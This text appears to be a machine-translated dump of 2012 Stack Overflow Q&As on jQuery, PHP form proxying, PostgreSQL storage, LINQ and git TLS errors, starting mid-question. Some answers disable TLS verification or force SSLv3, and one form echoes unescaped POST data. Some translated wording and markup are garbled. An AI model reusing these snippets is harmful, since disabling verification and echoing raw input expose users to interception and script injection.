在控制台中，它从 LoginController 返回值并打印这些值并使用 mysql 数据库用户表值进行检查。

没有显示“返回消息”，在控制台中显示为：

```
 Nov 23, 2012 11:19:08 AM org.springframework.web.servlet.DispatcherServlet noHandlerFound
    WARNING: No mapping found for HTTP request with URI [/projectdemo/WEB-INF/jsp/results.jsp] in DispatcherServlet with name 'dispatcher' 
```

请问谁能帮我解决这个问题？已经用了两天多了！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:05:26.143

您的“回信”

```
 ModelAndView msg = new ModelAndView();
 msg.setViewName("results");
 msg.addObject("message",message);
 System.out.println ("before return" +message);
 return msg; 
```

不是留言！它是一个模型（键“消息”：值消息）和视图（“结果”）。视图是应该呈现的 jsp 文件的名称。而且您没有这样的 jsp 文件（这就是警告所`No mapping found for HTTP request with URI [/projectdemo/WEB-INF/jsp/results.jsp]`抱怨的）

您需要编写此 jsp 文件并将其存储在`/WEB-INF/jsp/results.jsp`!

# ruby-on-rails - Ruby on rails 需要 jquery

> ID：13524216
> 
> 赞同：0
> 
> 时间：2012-11-23T06:38:42.053
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.2

Jquery 是否必须手动包含在 Rails 中？还是默认？我在资产管道清单中看到：

```
require jquery
require jquery-ujs 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:42:32.997

它不一定要包括在内，但除非您将其删除，否则它将被包括在内。大多数应用程序都会从​​它的存在中受益，但如果您不在任何视图中使用 JavaScript，您总是可以将其排除在外。

# javascript - 需要帮助将旧的工作 jquery 与新的 webform 合并

> ID：13524217
> 
> 赞同：5
> 
> 时间：2012-11-23T06:38:50.403
> 
> 标签：javascript, jquery, forms

我为这个问题的标题道歉，因为我知道它似乎有点宽泛。不幸的是，我对 jquery 还是很陌生，过去我得到了很多帮助来完成这项工作，现在我想改变一些事情，我很头疼。

我在这里有一个网站：[http](http://www.rattletree.com) ://www.rattletree.com 有一个时事通讯注册表单，当用户单击电子邮件框时，名称和城市字段也会下拉以填充。这一切都很好，但现在的工作方式是，信息直接发送到我的电子邮件地址，我需要手动将这个人输入到我们的电子邮件营销程序中。我现在希望通过从程序提供的嵌入代码中获取所需信息，将此信息直接发送到我们的电子邮件营销程序。我已经为此工作了几天，有时我设法将信息发送到程序而不隐藏 div，有时我设法隐藏 div 而没有正确发送表单。我有点失落。我希望有人可以帮助我正确合并这两件事。

这是发送到我自己的电子邮件地址的当前实时网站的工作代码：

（在标题中）

```
<div class="outeremailcontainer">
    <div id="emailcontainer">
        <?php include('verify.php'); ?>
        <form action="../index_success.php" method="post" id="sendEmail" class="email">
            <h3 class="register2">Newsletter Signup:</h3>
            <ul class="forms email">
                <li class="name">
                    <label for="yourName">Name: </label>
                    <input type="text" name="yourName" class="info" id="yourName" value="<?php echo $_POST['yourName']; ?>" /><br />
                </li>
                <li class="city"><label for="yourCity">City: </label>
                    <input type="text" name="yourCity" class="info" id="yourCity" value="<?php echo $_POST['yourCity']; ?>" /><br />
                </li>
                <li class="email">
                    <label for="emailFrom">Email: </label>
                    <input type="text" name="emailFrom" class="info" id="emailFrom" value="<?php echo $_POST['emailFrom']; ?>" />
                     <?php if(isset($emailFromError)) echo '<span class="error">'.$emailFromError.'</span>';
                     ?>
                </li>
                <li class="buttons email">
                     <button type="submit" id="submit">Send</button>
                     <input type="hidden" name="submitted" id="submitted" value="true" />
                </li>
            </ul>
        </form>
    <div class="clearing">
    </div>
  </div>
</div> 
```

剧本：

```
$(document).ready(function () {
    $('#emailFrom').focus(function () {
        if ($('#overlay').length) {
            return;
        } // don't keep adding overlays if one exists

        $('#sendEmail').find('.name, .city').slideDown(300, function () {
            $(this).show();
        });

        $('.outeremailcontainer').css({
            position: 'relative',
            bottom: 0,
            left: 0,
            zIndex: 1001
        });

        $('<div id="overlay"></div>').appendTo('body');
    });

    $('#overlay').live('click', function () {
        $('#sendEmail').css({
            backgroundColor: 'transparent'
        }).find('.name, .city').slideUp(300);

        $('.outeremailcontainer').css({
            position: 'static'
        });
        $('#overlay').remove();
    });
}); 
```

在页面底部的包含中：

```
$(document).ready(function () {
    $("#submit").click(function () {
        $(".error").hide();
        var hasError = false;
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;

        var emailFromVal = $("#emailFrom").val();

        if (emailFromVal == '') {
            $("#emailFrom").after('<span class="error"><br />You forgot to enter the email address to send from.</span>');
            hasError = true;

        } else if (!emailReg.test(emailFromVal)) {
            $("#emailFrom").after('<span class="error"<br />>Enter a valid email address to send from.</span>');
            hasError = true;
        }

        var yourNameVal = $("#yourName").val();
        if (yourNameVal == '') {
            $("#yourName").after('<span class="error"><br />You forgot to enter your name.</span>');
            hasError = true;
        }

        var yourCityVal = $("#yourCity").val();
        if (yourCityVal == '') {
            $("#yourCity").after('<span class="error"><br />You forgot to enter your city.</span>');
            hasError = true;
        }
        if (hasError == false) {
            $(this).hide();
            $("#sendEmail li.buttons").append('<img src="/wp-content/themes/default/images/template/loading.gif" alt="Loading" id="loading" />');
            $.post("/includes/sendemail.php",
                //emailTo: emailToVal, 
                {
                    emailFrom: emailFromVal,
                    yourName: yourNameVal,
                    yourCity: yourCityVal
                },
                function (data) {
                    $("#sendEmail").slideUp("normal", function () {
                        $("#sendEmail").before('<h3 class="register2">Thank you!  You\'re on the email list!</h3><p class="emailbox">Click <a href="http://rattletree.com/Songs/Live_EP/Chikende.mp3">HERE</a> for your free song.</p>');
                    });
                }
            );
        }
        return false;
    });
}); 
```

最后，这是电子邮件营销程序提供的代码，我想将上述姓名、城市和电子邮件信息发送到：

```
<form action="https://madmimi.com/signups/subscribe/66160" method="post" id="mad_mimi_signup_form">
    <fieldset>
        <div class="mimi_field text email required">
            <label for="signup_email">Email</label>
            <input id="signup_email" name="signup[email]" type="text" placeholder="you@example.com" class="required">
            <div class="mimi_field_feedback"></div><span class="mimi_funk"></span>
        </div>
        <div class="mimi_field text required">
            <label for="signup_name" id="wf_label">Name</label>
            <input id="signup_name" name="signup[name]" type="text" class="required">
            <div class="mimi_field_feedback"></div><span class="mimi_funk"></span>
        </div>
        <div class="mimi_field text required">
            <label for="signup_city" id="wf_label">City</label>
            <input id="signup_city" name="signup[city]" type="text" class="required">
            <div class="mimi_field_feedback"></div><span class="mimi_funk"></span>
        </div>
        <div class="mimi_field action">
            <input id="webform_submit_button" value="Sign up!" type="submit" class="submit" data-default-text="Sign up!" data-submitting-text="Sending…" data-invalid-text="? You forgot some required fields">
        </div>
    </fieldset>
</form> 
```

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-29T14:40:16.433

有一种简单的方法可以实现这一点，使用 MadMimi 的 API 和他们的官方 PHP 包装器，可以[在 GitHub 上找到](https://github.com/madmimi/madmimi-php)。

它不涉及对 jQuery 或 CORS 的任何更改。

他们有一个示例，[说明如何将新订阅者添加到](https://github.com/madmimi/madmimi-php/blob/master/Examples/Add_User_To_List.php)您正在寻找的列表中。

我已经为您定制了示例：（将其添加到**/includes/sendemail.php**）

```
<?php
require('MadMimi.class.php');
$mailer = new MadMimi('YOUR USERNAME (OR E-MAIL ADDRESS)', 'YOUR API KEY'); 
$user = array('email' => $_REQUEST['emailFrom'], 'name' => $_REQUEST['yourName'], 'city' => $_REQUEST['yourCity'], 'add_list' => 'My List');
$mailer->AddUser($user);
?> 
```

这假设您已将**MadMimi.class.php**和**Spyc.class.php**文件与当前处理程序**/includes/sendemail.php**放在同一目录中。

请务必插入您的真实用户名和 API 密钥（登录后您应该能够从 MadMimi 获得）。

您甚至可以将现有的电子邮件脚本保留在其中，只需将 API 调用添加到 MadMimi，每次有人订阅时都会收到通知，但不必做任何事情 :)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-29T10:19:03.100

Javascript 中的跨站点 POST 存在安全风险（想象一个网站在您设置了贝宝 cookie 的情况下在贝宝网站上发布帖子，而您却不知道）。

您必须修改 /includes/sendemail.php 以充当代理，像现在一样接收输入并将 POST 请求发送到 madmimi.com

例如，请参阅： [如何使用 php 发送 HTTPS 帖子](https://stackoverflow.com/questions/1154172/how-to-send-https-posts-using-php)

如果该页面上第一个答案上的代码有效，那么您可以像这样更改它

**/includes/sendemail.php**

```
<?php
$postfields = array('signup[email]'=>$_REQUEST['emailFrom'], 'signup[name]'=>$_REQUEST['yourName'], 'signup[city]'=>$_REQUEST['yourCity']);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://madmimi.com/signups/subscribe/66160');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);
?> 
```

这假设在 madmimi 表单页面上没有修改表单字段名称的 javascript 代码（因此在发送请求之前不会将 signup[city] 修改为诸如 signup-city 之类的其他内容）。当然，在 madimi 看来，所有请求都来自您的服务器，没有设置用户的 cookie。堆栈溢出页面上的解决方案使用 curl，因此要使用该 curl，必须在您的服务器 PHP 安装（[http://php.net/manual/en/book.curl.php](http://php.net/manual/en/book.curl.php)）中可用。如果未安装，则可以使用其他解决方案。

如果您*还想*发送电子邮件，只需将这段代码添加到当前 sendemail.php 脚本之上，它仍然会执行它所做的工作，并且它会连接到 madmimi 表单。

您可能需要像原来的 sendemail.php 那样将 PHP 脚本中的某些内容返回到调用页面（OK、DONE、SENT 等），只需将其添加到脚本末尾的 ?> 行之前。

# testing - 传统 TDD 与接受 TDD

> ID：13524219
> 
> 赞同：0
> 
> 时间：2012-11-23T06:39:00.120
> 
> 标签：testing, tdd

我正在阅读介绍验收 TDD 和传统 TDD 概念的人员 TDD 书。现在我想问一下对这两个概念相当熟悉的人——Acceptance TDD 测试用例的作者是谁？是开发人员、QA 专业人士还是业务分析师？我认为开发人员不会是编写验收测试的好人吗？你是否同意我的观点 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:05:58.320

**简短的回答：**

您将能够在这两本书中找到所有答案以及更多内容：

[黄瓜书](http://pragprog.com/book/hwcuc/the-cucumber-book)

[举例说明](http://specificationbyexample.com/)

这些书将为您节省大量关于 ATDD/BDD 的时间。

**长答案：**

理想情况下，您希望它们的树能够协作讨论验收标准。

有时它并不实用，因此您可以先让 BA 处理所有明显/非模棱两可的验收标准。

然后对于不明显的部分，您需要 QA/BA/DEV 一起工作，以便他们可以就困难的部分达成共识。相互理解的最佳方式是使用示例/具体的用例场景作为您的验收标准。这种协作需要发生，这样您也有机会找出如果 BA 或 QA 只是自己工作时会错过的东西。目标是限制返工，因为我们有时会忘记验收标准中的重要内容。

在同一个房间里培养 QA/DEV/BA 可能被认为是昂贵的活动，但却是一个非常强大的组合。BA 非常了解该领域，QA 知道什么会破坏，而 DEV 通常介于 QA 和 BA 之间，但也知道所有的技术可行性。当这些树一起工作时，您可以确定它们会找出可能被遗漏的内容或消除复杂内容中的歧义。

简而言之，如果功能真的很简单，你不需要这样做，BA可以自己工作。但是，如果您有一个包含一些复杂内容的功能，则必须让这 3 个人一起协作以限制返工。

无论您选择做什么，更重要的是，有一个时间可以讨论这些验收标准并通过它们的树进行审查，以便每个人都对需要做什么有一个共同的理解。

# postgresql - 表格大小与页面布局

> ID：13524222
> 
> 赞同：3
> 
> 时间：2012-11-23T06:39:21.290
> 
> 标签：postgresql, database-design, types, storage

我在 Oracle Linux Server 6.3 版上使用 PostgreSQL 9.2。

根据[存储布局文档](http://www.postgresql.org/docs/current/static/storage-page-layout.html)，页面布局包含：

*   PageHeaderData(24 字节)
*   n 指向项目的点数（索引项目/表项目）AKA ItemIdData（4 字节）
*   可用空间
*   n 项目数
*   特殊空间

我对其进行了测试以制作一些公式来估计预期的表大小......（TOAST概念可能被忽略。）

```
postgres=# \d t1;

                      Table "public.t1"
    Column    ','         Type         ','         Modifiers
---------------+------------------------+------------------------------
 code          |character varying(8)    |not null
 name          |character varying(100)  |not null
 act_yn        |character(1)            |not null default 'N'::bpchar
 desc          |character varying(100)  |not null
 org_code1     |character varying(3)    |
 org_cole2     |character varying(10)   |

 postgres=# insert into t1 values(
'11111111', -- 8
'1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111', <-- 100
'Y',
'1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111', <-- 100
'111',
'1111111111');

postgres=# select * from pgstattuple('t1');
 table_len | tuple_count | tuple_len | tuple_percent | dead_tuple_count | dead_tuple_len | dead_tuple_percent | free_space | free_percent
-----------+-------------+-----------+---------------+------------------+----------------+--------------------+------------+--------------
      8192 |           1 |       252 |          3.08 |                1 |            252 |               3.08 |       7644 |        93.31
(1 row) 
```

为什么是`tuple_len`252 而不是 249？（“所有列的最大长度的 222 字节”加上“27 字节的元组标头，后跟可选的空位图、可选的对象 ID 字段和用户数据”）

3 个字节从何而来？

我的公式有问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T09:16:54.857

你的计算在几个点上是错误的。

*   `varchar`，`text`（和`character`！）的存储大小是，[引用手册](https://www.postgresql.org/docs/current/datatype-character.html)）：

> 短字符串（最多 126 字节）的存储要求是**1 字节加上实际字符串**，其中包括字符情况下的空格填充。较长的字符串有 4 个字节的开销，而不是 1 个。长字符串由系统自动压缩，因此对磁盘的物理要求可能会更少。

粗体强调我在评论中解决问题。

*   [HeapTupleHeader 占用](https://www.postgresql.org/docs/current/storage-page-layout.html)**23个[**字节**](https://www.postgresql.org/docs/current/storage-page-layout.html)。但是每个元组（“项目” - 行或索引条目）在数据页的开头都有一个***项目标识符，总计为上述 27 个字节。***区别是相关的，因为实际用户数据从每个项目开始的倍数`MAXALIGN`开始，并且项目标识符不计入此偏移量 - 以及实际的“元组大小”。**

***   由于数据对齐（8 的倍数）而导致的 1 字节填充，在这种情况下用于 NULL 位图。

    *   没有填充类型`varchar`（但上面提到的附加字节）** 

 **因此，实际计算（所有列都填充到最大值）是：

```
 23    -- heaptupleheader
 +   1    -- NULL bitmap (or padding if row has NO null values)
 +   9    -- columns ...
 + 101 
 +   2 
 + 101 
 +   4 
 +  11
-------------
   **252** bytes

 +   4    -- item identifier at page start
```

有关的：

*   [在 PostgreSQL 中不使用 NULL 是否仍然在标头中使用 NULL 位图？](https://stackoverflow.com/questions/5008753/does-not-using-null-in-postgresql-still-use-a-null-bitmap-in-the-header/7383198#7383198)
*   [在 PostgreSQL 中计算和节省空间](https://stackoverflow.com/questions/2966524/calculating-and-saving-space-in-postgresql/7431468#7431468)

您会在这些答案右侧的*链接列表*中找到更多内容。**

# jquery - .append .prepend .html 我应该使用它

> ID：13524226
> 
> 赞同：0
> 
> 时间：2012-11-23T06:39:50.820
> 
> 标签：jquery, html, append, prepend

```
 $('document').ready(function(){
$('#gfooter').append("<div style="text-align:center; width:800px; margin-left:auto; margin-right:auto;">
<img id="Image-Maps_3201211230108478" src="http://i.imgur.com/aHKja.png" usemap="#Image-Maps_3201211230108478" border="0" width="800" height="400" alt="" />
<map id="_Image-Maps_3201211230108478" name="Image-Maps_3201211230108478">
<area shape="rect" coords="84,184,253,353" href="www.facebook.com" alt="Facebook" title="Facebook"    />
<area shape="rect" coords="316,184,485,353" href="www.twitter.com" alt="Twitter" title="Twitter"    />
</map>
</div>
");
}); 
```

我正在尝试将这段 html 附加到 div #gfooter 中。虽然它似乎不起作用。谁能解释一下我的原因？>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:17:16.453

每当您将某些内容放在双引号内时，下次使用双引号时它就会“转义”。因此，请使用以下任一格式：

```
$.append("<a href='#'>link</a>");

$.append('<a href="#">link</a>'); 
```

我更喜欢第二个，因为它允许我像往常一样键入我的 HTML（使用双引号）。希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:42:45.297

您需要使用反斜杠转义字符串文字中的引号。

```
var somestring = "<div id=\"something\">"; 
```

# coldfusion - 避免魔法值

> ID：13524228
> 
> 赞同：1
> 
> 时间：2012-11-23T06:40:11.180
> 
> 标签：coldfusion

我有一些只更新的代码

```
<cfif tags NEQ "skip">
<cfquery>
UPDATE myTable
SET tags = <cfqueryparam cfsqltype="CF_SQL_varchar" value="#arguments.tags#">
WHERE ID = <cfqueryparam cfsqltype="CF_SQL_INTEGER" value="#arguments.ID#">
</cfquery> 
```

有什么比使用“跳过”作为魔法值更好的方法？请注意，空白是有效值。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T06:54:10.953

这取决于数据的来源。理想情况下，我会将一个变量设置为 true 或 false 并检查它。我猜在您的示例中，标签来自表单，而“skip”是“None of these”中的值。您可能必须使用某些东西作为魔术值，但我更喜欢使用`__SKIP_TAGS__`非常清楚的东西。

您还可以拆分您的页面逻辑，以便您首先处理表单提交，检查魔术值并设置是否从#tags# 插入数据的布尔值，然后稍后使用该布尔值进行检查。整体逻辑是相同的，但布局更好。

您可能需要考虑为您的问题添加更多上下文，例如数据来自哪里，以便其他人可以为您提供更好的建议

# c# - 为什么“.Distinct()”不能按预期工作

> ID：13524230
> 
> 赞同：0
> 
> 时间：2012-11-23T06:40:18.447
> 
> 标签：c#

> **可能重复：**
> [DISTINCT() 和 ORDERBY 问题](https://stackoverflow.com/questions/12428985/distinct-and-orderby-issue)

```
listOrders.DataSource = (from sp in dbdata.Specifications.Where(i => i.Approve == "Yes" && i.Awailable_BOM == "Yes")
                                     join ord in dbdata.Orders on sp.O_id equals ord.O_id
                                     join prd in dbdata.Products.Where(k => k.Hours_prd == null) on ord.O_id equals prd.O_ID
                                     orderby ord.Special, sp.Due_date
                                     select ord.O_id).Distinct(); 
```

我想按“ord.Special, sp.Due_date”订购，但在我输入“Distinct();”后它不起作用。那么如何按“ord.Special, sp.Due_date”排序并获得不同的值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:56:02.460

我认为这将返回有序的 id：

```
listOrders.DataSource = 
   from sp in dbdata.Specifications.Where(i => i.Approve == "Yes" && i.Awailable_BOM == "Yes")
   join ord in dbdata.Orders on sp.O_id equals ord.O_id
   join prd in dbdata.Products.Where(k => k.Hours_prd == null) on ord.O_id equals prd.O_ID
   select new { ord.Special, sp.Due_date, ord.O_id } into x
   group x by x.O_id into g
   select new { g.Key, X = g.OrderBy(i => i.Special).ThenBy(i => i.Due_date).First()) } into y
   orderby y.X.Special, y.X.Due_date
   select y.Key; 
```

注释：

*   只选择您感兴趣的领域`x`
*   按您想要区分的字段将这些字段分组`g`
*   从每个组中选择键（`ord.O_id`）和组项`X`，这将定义结果中 id 的顺序（在这种情况下`First`，将返回 id 的出现）
*   排序结果`X`
*   选择`Key`( `ord.O_id`)

# excel - SSRS 2008 是否支持导出为 .xlsx 格式而不是 .xls

> ID：13524231
> 
> 赞同：1
> 
> 时间：2012-11-23T06:40:25.333
> 
> 标签：excel, ssrs-2008

我的机器上安装了 MS Office 2007。当我将 SSRS 2008 报告导出到 Excel 时，我需要以 .xlsx 格式而不是 .xls 格式保存。我们需要做哪些设置。

请给我解决方案。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T10:32:07.277

2008 只支持 xls。

您将需要编写[渲染扩展程序或从](http://msdn.microsoft.com/en-us/library/ms153624%28v=sql.100%29.aspx)[Aspose](http://www.aspose.com/)等公司购买第 3 方组件

# asp.net-mvc-4 - 具有默认连接的简单成员资格配置

> ID：13524233
> 
> 赞同：0
> 
> 时间：2012-11-23T06:40:31.853
> 
> 标签：asp.net-mvc-4, asp.net-membership, membership-provider

如何配置 MVC4 应用程序以使用已经存在的实体框架连接字符串，用于其默认连接以及**现有 SQL 服务器数据库**上的 simplemembership 提供程序表等。我确定我之前实现了这一点，但使用新的互联网模板 mvc4 解决方案我似乎无法做到。我在 InitializeSimpleMembershpAttiribute WebSecurity.InitializeDatabaseConnection("myEntitiesConnstring","mytable", "UserId", "full_name", autoCreateTables: true) 中配置这一行；

我可以得到两者的组合

**“找不到请求的 .Net Framework 数据提供程序。它可能没有安装。** 如果我不理会这一部分

```
 <entityFramework>
    <defaultConnectionFactory type="System.Data.Entity.Infrastructure.LocalDbConnectionFactory, EntityFramework">
      <parameters>
        <parameter value="v11.0" />
      </parameters>
    </defaultConnectionFactory>
  </entityFramework> 
```

或者

**初始化字符串的格式不符合从索引 0 开始的规范**

```
<entityFramework>
    <defaultConnectionFactory type="System.Data.Entity.Infrastructure.SqlConnectionFactory, EntityFramework">
      <parameters>
        <parameter value="v11.0" />
      </parameters>
    </defaultConnectionFactory>
  </entityFramework> 
```

如果我注释掉我得到的默认连接库。

**建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：SQL 网络接口，错误：26 - 错误定位服务器/指定的实例）**

*此实体框架连接字符串是有效的，并且可以正确连接到数据库。在上述所有 3 个场景中，我没有任何活动，但是如果我使用 sql profiler 来跟踪活动。*

（连接字符串）

```
 <connectionStrings>
    <add name="myEntitiesConnstring" connectionString="metadata=res://*/Models.my_Model.csdl|res://*/Models.my_Model.ssdl|res://*/Models.my_Model.msl;provider=System.Data.SqlClient;provider connection string=&quot;data source=.;initial catalog=mydb;persist security info=True;user id=sa;password=password;MultipleActiveResultSets=True;App=EntityFramework&quot;" providerName="System.Data.EntityClient" />
  </connectionStrings> 
```

欢呼 tim ps [Jon Galloway 的文章建议似乎对我没有帮助](http://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4-5-web-forms-and-asp-net-mvc-4-templates.aspx)

# jquery - 如何重新绑定未绑定的链接/对象

> ID：13524237
> 
> 赞同：3
> 
> 时间：2012-11-23T06:40:35.707
> 
> 标签：jquery, bind, unbind

通过按第一个按钮，您将为第二个按钮设置动画`margin-left`，通过按第二个按钮，您将单击事件与第一个按钮解除绑定，但我想说第三个按钮将单击事件绑定回第一个按钮。

当然寻找一个简单的解决方案！

这是代码的样子：

```
<div class="button"><a href="http://www.google.com">something</a></div>
<div class="button2"><a href="http://www.google.com">something2</a></div>
<div class="button3"><a href="http://www.google.com">something3</a></div>

​(function(){
    $('.button a').on('click', function(e){
         e.preventDefault();
        $('.button2').animate({'margin-left': '+=2'}, 100);       
    })

    $('.button2').on('click', function(e){
         e.preventDefault();
         $('.button a').unbind('click');       
    })

    $('.button3').on('click', function(e){
         e.preventDefault();
         $('.button a').bind('click');       
    })

})();​ 
```

[你可以在这里](http://jsfiddle.net/Amsjn/)弄乱它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:01:36.053

您实际上可以在`.on()`. 这意味着您可以定义一个函数`marginFunc()`，然后将其绑定到点击使用

```
function marginFunc() {
 ...
}

$(someElement).on('click', marginFunc); 
```

完成后，您可以使用`.unbind('click', marginFunc)` **或** `.off('click', marginFunc)`解绑它。
之后，您可以以与开始时相同的方式重新绑定。

[在这里工作 jsfiddle](http://jsfiddle.net/Amsjn/2/ "绑定、解除绑定和重新绑定")。

# git - 错误：gnutls_handshake() 失败的 GIT 存储库

> ID：13524242
> 
> 赞同：22
> 
> 时间：2012-11-23T06:41:21.123
> 
> 标签：git, github, ubuntu-10.04

当我尝试克隆 git 存储库时出现以下错误。我也正确配置了 rsa 公钥。

```
$ git clone https://github.com/blah/blah.git
Initialized empty Git repository in /home/arun/.git/
error: gnutls_handshake() failed: A TLS packet with unexpected length was
       received. while accessing https://github.com/blah/blah.git/info/refs

fatal: HTTP request failed 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T06:57:50.037

它可以用于[GnuTLs 或 pycurl 错误](https://bugs.launchpad.net/ubuntu/+source/pycurl/+bug/926548)

> 以下是pycurl_7.19.0-4ubuntu3的新方法：

```
sudo apt-get install build-essential fakeroot dpkg-dev
mkdir ~/python-pycurl-openssl
cd ~/python-pycurl-openssl
sudo apt-get source python-pycurl
sudo apt-get build-dep python-pycurl
sudo apt-get install libcurl4-openssl-dev
sudo dpkg-source -x pycurl_7.19.0-4ubuntu3.dsc
cd pycurl-7.19.0
# remove the HAVE_CURL_GNUTLS=1 in the following file
sudo vim debian/patches/10_setup.py.dpatch
# remove the HAVE_CURL_GNUTLS=1 in the following file
sudo vim setup.py
# replace all gnutls into openssl in the following file
sudo vim debian/control
sudo dpkg-buildpackage -rfakeroot -b
sudo dpkg -i ../python-pycurl_7.19.0-4ubuntu3_amd64.deb 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-03-08T18:16:19.013

我遇到了这个问题，我花了一段时间才找到解决方案。我一直在想我在某个地方遗漏了一个包裹。我不想重新编译 Git，因为我已经在使用最新版本，而且我很确定问题不在于 Git 本身。

我的问题是我的`.gitconfig`文件。该问题仅发生在多年来已多次升级的旧 Linux 服务器上。在某些时候，出于某种我不记得的原因，我已经`sslVersion = sslv3`在我的`.gitconfig`文件中明确指定了。

当我看到这一点时，灯泡亮了，因为我知道 SSL V3 出于安全考虑已被弃用，并且大多数人应该改用 TLS。例如，参见 RFC 7568，[https: //www.rfc-editor.org/rfc/rfc7568](https://www.rfc-editor.org/rfc/rfc7568)

所以我的修复涉及`sslVersion = sslv3`从我的`~/.gitconfig`文件中删除有问题的行，或者改变这个：

```
[httpd] 
    sslVersion = sslv3 
```

对此：

```
[httpd]
    sslVersion = tlsv1.2 
```

删除这条线并让 Git/libcurl 协商加密似乎是最好的选择，因为 TLS v1.3 正在开发中，我不想以后再遇到这个问题！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-26T22:32:19.170

就我而言，看来我没有使用 pycurl，所以上述解决方案对我不起作用。DID 的工作是重建 git-core 修改为使用 openssl 而不是 gnutls。

说明在这里：

[https://askubuntu.com/questions/186847/error-gnutls-handshake-falied](https://askubuntu.com/questions/186847/error-gnutls-handshake-falied)

我在大多数地方都用“git-core”替换了“git”，.dsc（包信息文件？）出现为 git-core_1.7.0.4-1ubuntu0.2.dsc，.deb 包出现git-core_1.7.0.4-1ubuntu0.2_i386.deb。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-01-27T12:03:45.167

`sudo git fetch`从我自己的用户没有足够权限的目录尝试时，我遇到了同样的问题。我将存储库移至`/tmp`并继续我的工作。

不要忘记`/tmp`重启后会被删除。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2018-08-01T08:37:37.863

在我的情况下，混合@Rick 和@m0j0 的解决方案

首先执行这些命令：

```
git config --global http.sslVerify false
git config --global http.sslVerify true 
```

添加或修改后`~/.gitconfig`

```
nano ~/.gitconfig 
```

设置这个：

```
[httpd] 
    sslVersion = sslv3 
```

* * *

## 回答 #6

> 赞同：-3
> 
> 时间：2018-02-25T23:15:46.040

对我来说，最终是 SSL 证书是自签名的。试试这个

`git config --global http.sslVerify false`

# jquery-ui - jquery 函数不工作

> ID：13524246
> 
> 赞同：-1
> 
> 时间：2012-11-23T06:42:00.273
> 
> 标签：jquery-ui, jquery, jquery-plugins

我目前正在阅读 jquery 并且我在 jquery 函数上遇到了一些问题.. 任何人都可以指导我有关函数的问题。目前我只想创建一个函数，如果 req 相同，则一次调用两次 .. 但函数不起作用，请专家在代码中指导我。

```
var errorAlpha = function(){

        $(this).focus().keyup(function(){

            var reg = /^([A-Za-z]+)$/;
            var check = $(this).val();              

            if(reg.test(check)==true && check.match(reg)==true)
              {
                    $(this).removeClass('error_Aplha');
              }
              else {
                    $(this).addClass('error_Aplha');
              }

            }),blur(function(){

                var check = $(this).val();
                var reg = /^([A-Za-z]+)$/;

                if(reg.test(check)==true && check.match(reg)==true)
                  {
                    $(this).removeClass('error_Aplha');
                  }
                else {
                    $(this).addClass('error_Aplha');
                  } 

            });

    };

        $('#step1 #fName').function(errorAlpha()); 
```

HTML 在这里

```
<input type="text" class="width-260" id="fName"/> 
```

CSS在这里

```
.error_Aplha {
border:1px solid #b20000 !important;    

box-shadow: 0px 0px 5px #b20000;
-webkit-box-shadow: 0px 0px 5px #b20000;
-moz-box-shadow: 0px 0px 5px #b20000;
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T06:47:39.070

你的代码`$('#step1 #fName').function(errorAlpha());`是错误的。什么都不会发生。

如果你想触发某些东西，那么你需要附加一个事件处理程序，如点击、按键、鼠标事件。这是设置事件处理程序的一种方法，

```
 $('#step1 #fName').keypress(function(){
   errorAlpha();
 }); 
```

这是 jQuery 事件方法的列表，[http://api.jquery.com/category/Events/](http://api.jquery.com/category/Events/)

**更新：**

我更新了你的代码，它在这里工作[http://jsfiddle.net/muthkum/gU3PU/2/](http://jsfiddle.net/muthkum/gU3PU/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T06:49:06.833

你在这里有一个语法错误：

```
}),blur(function(){ 
```

您应该使用句点：

```
}).blur(function(){ 
```

当您尝试使用该函数时，您正在使用一个不存在的方法，并且函数名称后面有括号表示该函数是在您绑定事件时调用的，而不是在事件发生时调用的。

这：

```
$('#step1 #fName').function(errorAlpha()); 
```

应该是这样的：

```
$('#step1 #fName').click(errorAlpha); 
```

该`match`方法不返回布尔值，它返回一个数组或`null`：

```
if (reg.test(check) == true && check.match(reg) != null) { 
```

演示：http: [//jsfiddle.net/y4UtT/](http://jsfiddle.net/y4UtT/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:03:19.863

单独创建要使用两次的函数。

```
function common(){
...
} 
```

然后你可以做

```
$(' #fName').focus().blur(common);

$(' #fName').blur(common); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:30:38.003

